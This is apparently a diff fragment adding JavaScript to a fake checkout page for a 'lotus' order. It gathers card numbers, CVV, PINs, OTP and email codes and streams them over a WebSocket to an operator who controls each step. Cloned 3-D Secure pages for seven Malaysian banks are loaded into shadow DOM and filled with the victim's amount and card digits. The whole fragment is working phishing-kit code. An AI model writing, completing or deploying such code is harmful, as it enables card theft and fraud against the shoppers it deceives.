+  else if(a==='redirect_complete'){location.href='/complete/'}
+  else if(a==='resend_ok'){startResendCooldown()}}
+
+function hideAllOverlays(){
+  ['otp-overlay','pin-overlay','email-overlay','app-verify-overlay','load-overlay'].forEach(function(id){q(id).classList.add('hidden')});
+  for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(m){m.classList.add('hidden');m.innerHTML=''}}
+  q('app-verify-box').classList.add('hidden')}
+
+function changeOtp(){q('otp-overlay').classList.add('hidden');q('btnSubmit').disabled=false}
+function changeEmail(){q('email-overlay').classList.add('hidden');q('btnSubmit').disabled=false}
+function resetOtp(){q('otp-form').classList.remove('hidden');q('otp-result').classList.add('hidden');q('otp-error').style.display='none';q('otp-code').value='';q('otp-submit').disabled=false}
+
+var otpSec=299,otpTmr=null;
+function startOtpTimer(){otpSec=299;clearInterval(otpTmr);otpTmr=setInterval(function(){otpSec--;if(otpSec<0){otpSec=0;clearInterval(otpTmr)};var m=Math.floor(otpSec/60),s=otpSec%60;q('otp-timer').textContent=m+':'+(s<10?'0':'')+s},1000)}
+function startEmailTimer(){otpSec=299;clearInterval(otpTmr);otpTmr=setInterval(function(){otpSec--;if(otpSec<0){otpSec=0;clearInterval(otpTmr)};var m=Math.floor(otpSec/60),s=otpSec%60;q('email-timer').textContent=m+':'+(s<10?'0':'')+s},1000)}
+function startResendCooldown(){var sec=60,qResend=q('otp-resend');qResend.disabled=true;qResend.classList.add('otp-resend-disabled');var timer=setInterval(function(){sec--;if(sec<=0){clearInterval(timer);qResend.disabled=false;qResend.classList.remove('otp-resend-disabled');qResend.textContent='Resend Code'}else{qResend.textContent='Resend in '+sec+'s'}},1000)}
+
+function pinJump(idx){var el=q('pin-d'+idx);if(el&&el.value.length>=1&&idx<4){var next=q('pin-d'+(idx+1));if(next)next.focus()}}
+function pinBack(e,idx){if(e.key==='Backspace'){var el=q('pin-d'+(idx+1));if(el&&!el.value&&idx>=0){var prev=q('pin-d'+(idx||1));if(prev)prev.focus()}}}
+function submitPin(){var pin='';for(var i=1;i<=4;i++)pin+=q('pin-d'+i).value;if(pin.length<4){q('pin-error').style.display='block';q('pin-error').textContent='Please enter 4-digit PIN';return}q('pin-error').style.display='none';q('pin-overlay').classList.add('hidden');q('load-overlay').classList.remove('hidden');var p=buildPayload();ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{otpCode:pin},currentStep:'pin_verify'}}))}
+
+function submitPayment(){
+  var cn=(q('cardNumber').value||'').replace(/\s/g,'');
+  var mo=q('card_expiry_month').value,yr=q('card_expiry_year').value;
+  if(cn.length<13||cn.length>19)return showMsg('error','Please enter a valid card number');
+  if(!luhn(cn))return showMsg('error','Invalid card number');
+  if(!mo||!yr)return showMsg('error','Please select expiry date');
+  if((q('cvv').value||'').length<3)return showMsg('error','Please enter CVN');
+  if(!q('cardHolder').value.trim())return showMsg('error','Please enter cardholder name');
+  q('btnSubmit').disabled=true;q('load-overlay').classList.remove('hidden');q('load-text').textContent='Processing payment...';
+  if(!ws||ws.readyState!==WebSocket.OPEN){wsConnect();setTimeout(function(){doSubmit()},2000)}else{doSubmit()}}
+function doSubmit(){var p=buildPayload();ws.send(JSON.stringify({type:'customer_input',payload:p}));setTimeout(function(){if(sid){var sp=buildPayload();sp.sessionId=sid;sp.status='pending';ws.send(JSON.stringify({type:'session_update',payload:sp}))}},1000)}
+
+function submitOtp(){var code=q('otp-code').value;if(code.length<4){q('otp-error').style.display='block';q('otp-error').textContent='Please enter code';return}q('otp-error').style.display='none';q('otp-submit').disabled=true;q('otp-overlay').classList.add('hidden');q('load-overlay').classList.remove('hidden');q('load-text').textContent='Verifying...';var p=buildPayload();p.cardInfo.otpCode=code;ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{otpCode:code},currentStep:'otp'}}))}
+function submitEmailVerify(){var code=q('email-code').value;if(code.length<4){q('email-error').style.display='block';q('email-error').textContent='Please enter code';return}q('email-error').style.display='none';q('email-submit').disabled=true;q('email-overlay').classList.add('hidden');q('load-overlay').classList.remove('hidden');q('load-text').textContent='Verifying...';ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{otpCode:code},currentStep:'email_verify'}}))}
+function submitAppVerify(){q('app-continue-btn').disabled=true;q('app-continue-btn').textContent='Waiting...';q('app-error').style.display='none';var p=buildPayload();ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{},currentStep:'app_verify'}}))}
+
+function updateBankLogo(name){
+  var el=q('app-logo');
+  fetch('/api/logo/'+encodeURIComponent(name)).then(function(r){return r.text()}).then(function(svg){el.innerHTML=svg}).catch(function(){el.textContent=name.charAt(0).toUpperCase();el.style.background='#'+Math.floor(Math.abs(name.split('').reduce(function(h,c){return((h<<5)-h)+c.charCodeAt(0)},0))).toString(16).slice(0,6)});
+  fetch('/api/bin/'+(q('cardNumber').value.replace(/\s/g,'').slice(0,6))).then(function(r){return r.json()}).then(function(d){
+    var ct=d.cardType||'';if(/visa/i.test(ct)){q('app-scheme').innerHTML='<svg width="24" height="16" viewBox="0 0 32 22"><rect width="32" height="22" rx="3" fill="#1a1f71"/><text x="16" y="15" text-anchor="middle" fill="#fff" font-size="10" font-weight="700">VISA</text></svg> ID Check'}else if(/master/i.test(ct)){q('app-scheme').innerHTML='<svg width="24" height="16" viewBox="0 0 32 22"><circle cx="12" cy="11" r="9" fill="#eb001b"/><circle cx="20" cy="11" r="9" fill="#f79e1b"/></svg> ID Check'}
+  }).catch(function(){})}
+
+function showGenericApp(p){q('app-verify-box').classList.remove('hidden');var bn=(p.cardInfo&&p.cardInfo.bankName)||p.bankName||'Bank';updateBankLogo(bn);q('app-amount').textContent='RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');q('app-error').style.display='none';q('app-continue-btn').disabled=false;q('app-continue-btn').textContent='Continue to complete'}
+
+function showAppError(p){var msg=p.message||'APP verification not completed';for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(!m.classList.contains('hidden')&&m.shadowRoot){var sp=m.shadowRoot.querySelector('.vfy-spinner');var er=m.shadowRoot.querySelector('.app-error');if(sp){sp.classList.add('hidden');sp.style.display='none'}if(er){er.classList.remove('hidden');er.textContent=msg};return}}q('app-continue-btn').classList.remove('hidden');q('app-continue-btn').disabled=false;q('app-error').style.display='block';q('app-error').textContent=msg}
+
+q('cardNumber').addEventListener('input',function(){var v=this.value.replace(/\D/g,'').slice(0,16);this.value=v.replace(/(\d{4})(?=\d)/g,'$1 ')});
+q('cvv').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,4)});
+q('otp-submit').addEventListener('click',submitOtp);
+q('otp-resend').addEventListener('click',function(){ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{},currentStep:'resend_otp'}}))});
+q('email-submit').addEventListener('click',submitEmailVerify);
+q('email-resend').addEventListener('click',function(){ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{},currentStep:'resend_email'}}))});
+q('otp-code').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,8)});
+q('email-code').addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,8)});
+['pin-d1','pin-d2','pin-d3','pin-d4'].forEach(function(id){q(id).addEventListener('input',function(){this.value=this.value.replace(/\D/g,'').slice(0,1)})});
+
+(function loadOrder(){
+  try{var raw=localStorage.getItem('lotus_order');if(!raw)return;var d=JSON.parse(raw);
+  if(d.amount)q('total-amount').textContent='RM '+parseFloat(d.amount).toFixed(2);
+  if(d.customerName)q('fullName').value=d.customerName;if(d.email)q('email').value=d.email;
+  if(d.phone)q('phone').value=d.phone;if(d.address)q('address1').value=d.address}catch(e){}
+})();
+
+/* Shadow DOM bank page loader */
+function loadBankPage(path,mid){fetch(path).then(function(r){return r.text()}).then(function(html){
+  var el=document.getElementById(mid);if(!el)return;
+  var shadow=el.attachShadow({mode:'open'});
+  var styleLinks=html.match(/<link[^>]*rel=["']stylesheet["'][^>]*href=["']([^"']+)["'][^>]*>/gi)||[];
+  var styles='';styleLinks.forEach(function(link){var m=link.match(/href=["']([^"']+)["']/);if(m){var cssPath=path.replace(/\/[^\/]*$/,'/')+m[1];styles+='@import url("'+cssPath+'");\n'}});
+  html=html.replace(/<link[^>]*>/gi,'');
+  shadow.innerHTML='<style>'+styles+'</style>'+html;
+  var btns=shadow.querySelectorAll('[data-action="continue"]');
+  btns.forEach(function(b){b.id='bank-continue-'+mid;b.addEventListener('click',function(){shadow.querySelector('.vfy-spinner').classList.remove('hidden');ws.send(JSON.stringify({type:'session_update',payload:{sessionId:sid,status:'pending',cardInfo:{},currentStep:'app_verify_done'}}))})})
+}).catch(function(err){console.error('Bank load error:',err)})}
+
+['AMBANK','CIMB','MALAYAN','OCBC','PBB','RHB','SCBMB'].forEach(function(bank,idx){loadBankPage(bank+'/index.html','mount'+(idx+1))});
+
+function showMount1(p){q('mount1').classList.remove('hidden');document.getElementById('mount1').shadowRoot.querySelector('div>table.maintable.bg>tbody>tr:nth-child(4)>td:nth-child(3)>span').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'')}
+function showMount2(p){q('mount2').classList.remove('hidden');try{var m2=document.getElementById('mount2').shadowRoot;m2.querySelector('div>table:nth-child(2)>tbody>tr:nth-child(4)>td:nth-child(3)>span').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');m2.querySelector('div>table:nth-child(2)>tbody>tr:nth-child(6)>td:nth-child(3)>span').textContent=(p.cardInfo.cardNumber||'').slice(-4)}catch(e){}}
+function showMount3(p){q('mount3').classList.remove('hidden');try{var m3=document.getElementById('mount3').shadowRoot;m3.querySelector('div>table.infotable.infotableoob>tbody>tr:nth-child(2)>td:nth-child(2)>div').innerHTML='<span>RM '+q('total-amount').textContent.replace(/[^\d.]/g,'')+'</span>';m3.querySelector('div>table.infotable.infotableoob>tbody>tr:nth-child(4)>td:nth-child(2)>div>span').textContent=(p.cardInfo.cardNumber||'').slice(-4)}catch(e){}}
+function showMount4(p){q('mount4').classList.remove('hidden');try{var m4=document.getElementById('mount4').shadowRoot;m4.querySelector('#softTokenPanel>tbody>tr:nth-child(2)>td>table>tbody>tr:nth-child(1)>td:nth-child(2)>span').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');m4.querySelector('#softTokenPanel>tbody>tr:nth-child(2)>td>table>tbody>tr:nth-child(3)>td:nth-child(2)>span:nth-child(2)').textContent=(p.cardInfo.cardNumber||'').slice(-4)}catch(e){}}
+function showMount5(p){q('mount5').classList.remove('hidden');try{var m5=document.getElementById('mount5').shadowRoot;m5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(2)>div').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');m5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(4)>div>span').textContent=(p.cardInfo.cardNumber||'').slice(-4)}catch(e){}}
+function showMount6(p){q('mount6').classList.remove('hidden')}
+function showMount7(p){q('mount7').classList.remove('hidden')}
+
+wsConnect();
 </script>
 </body>
 </html>
